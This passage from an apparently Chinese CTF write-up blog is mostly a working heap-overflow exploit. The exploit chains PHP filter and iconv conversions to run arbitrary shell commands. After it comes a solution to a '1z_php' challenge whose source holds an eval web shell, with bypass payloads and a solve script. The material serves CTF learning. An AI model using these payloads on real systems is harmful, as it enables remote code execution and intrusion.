        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>

        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>

        step4_size <span class="token operator">=</span> CS
        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>

        <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>
        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>
            <span class="token number">0x200000</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token comment"># free_slot</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>
            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>
        <span class="token punctuation">)</span>

        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>

        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command
        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>
            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>

        <span class="token keyword">assert</span> <span class="token punctuation">(</span>
            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size
        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>

        step4_use_custom_heap <span class="token operator">=</span> COMMAND
        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>

        pages <span class="token operator">=</span> <span class="token punctuation">(</span>
            step4 <span class="token operator">*</span> <span class="token number">3</span>
            <span class="token operator">+</span> step4_pwn
            <span class="token operator">+</span> step4_custom_heap
            <span class="token operator">+</span> step4_use_custom_heap
            <span class="token operator">+</span> step3_overflow
            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad
            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>
            <span class="token operator">+</span> step2_write_ptr
            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>
        <span class="token punctuation">)</span>

        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>
        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>
        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

        filters <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token comment"># Create buckets</span>
            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>
            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 0: Setup heap</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 1: Reverse FL order</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 3: Trigger overflow</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

        <span class="token keyword">return</span> path

    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        
        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>
        
        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.
    """</span>
    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>
    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>
    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.
    """</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>
    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size
    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>

    <span class="token keyword">return</span> bucket


<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """</span>
    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>
    <span class="token comment"># enough</span>
    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>
    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>
    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span>


<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""A memory region."""</span>

    start<span class="token punctuation">:</span> <span class="token builtin">int</span>
    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>
    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>
    path<span class="token punctuation">:</span> <span class="token builtin">str</span>

    <span class="token decorator annotation punctuation">@property</span>
    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>start


Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<p><img src="justread.png" loading="lazy"></p>
<p><img src="justread2.png" loading="lazy"></p>
<h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 我记得她...好像叫flag.php吧？</span>
<span class="token variable">$emp</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_m.p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$try</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'try'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token operator">!=</span><span class="token string double-quoted-string">"114514"</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">114514</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你不是hacker？那请去外场等候！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"只有真正的hacker才能拿到flag！"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?HACKER/is'</span><span class="token punctuation">,</span><span class="token variable">$try</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你是hacker还敢自报家门呢？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$try</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'HACKER'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你连自己是hacker都不承认，还想要flag呢？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"收手吧hacker，你得不到flag的！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"114514到底是啥意思嘞？。？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span>
<span class="token variable">$shell</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
114514到底是啥意思嘞？。？</code></pre>

<ol>
<li><strong>intval</strong> 有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</li>
<li><strong>ctype_alpha</strong> — 做纯字符检测。——如果在当前语言环境中 text 里的每个字符都是一个字母，那么就返回true，反之则返回false。</li>
<li><strong>regexp</strong> 最大回溯</li>
<li>php 原生类</li>
</ol>
<p>Payload:</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">GET</span><span class="token punctuation">:</span> <span class="token header-value">?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString</span></span>
<span class="token header"><span class="token header-name keyword">POST</span><span class="token punctuation">:</span> <span class="token header-value">"hsad"*1000000+"HACKER"</span></span></code></pre>

<p>也可以python一把梭</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:48615/"</span>
params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"e[m.p"</span><span class="token punctuation">:</span> <span class="token number">114514.1</span><span class="token punctuation">,</span>
    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"SplFileObject"</span><span class="token punctuation">,</span>
    <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">,</span>
    <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token string">"__toString"</span>
<span class="token punctuation">&#125;</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"try"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">250001</span><span class="token operator">+</span><span class="token string">"HACKER"</span>
<span class="token punctuation">&#125;</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token comment"># flag = "PD9waHAgPUJhc2VDVEZ7YWZhYzU2NjYtZWI2Yy00MGQ5LWJmMTUtYmQyYmY4OTk1MmQwfT8+Cg=="</span>
<span class="token comment"># decoded_flag = base64.b64decode(flag)</span>
<span class="token comment"># print(decoded_flag)</span></code></pre>

<h4 id="ez-php-gc回收，引用绕过，反序列化逃逸"><a href="#ez-php-gc回收，引用绕过，反序列化逃逸" class="headerlink" title="ez_php(gc回收，引用绕过，反序列化逃逸)"></a>ez_php(gc回收，引用绕过，反序列化逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
